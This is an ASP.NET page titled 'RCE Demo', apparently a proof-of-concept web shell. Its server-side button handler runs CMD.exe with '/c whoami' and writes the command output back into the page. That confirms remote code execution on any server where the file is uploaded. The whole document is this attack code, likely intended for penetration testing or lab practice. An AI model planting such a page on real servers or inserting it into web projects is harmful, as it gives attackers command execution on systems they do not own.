<!-- directives -->
<% @Page Language="C#" %>
<%@ Import Namespace="System" %>

<!-- code section -->
<script runat="server">
   private void execute(object sender, EventArgs e)
   {
			System.Diagnostics.Process process = new System.Diagnostics.Process();
			System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
			startInfo.UseShellExecute = false;
			startInfo.RedirectStandardOutput = true;
			startInfo.FileName = "CMD.exe";
			startInfo.Arguments = "/c whoami";
			process.StartInfo = startInfo;
			process.Start();
			string output = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
      response.InnerHtml = output;
   }
</script>

<!-- Layout -->
<html>
   <head>
      <title>RCE Demo</title>
   </head>
   <body>
      <h3>RCE Demo</h3>
      <form runat="server">
         <button runat="server" id="button1" type="submit" value="Enter..." OnServerClick="execute">Run</button>
         <h3> Results: </h3>
         <span runat="server" id="response" />
      </form>
   </body>
</html>
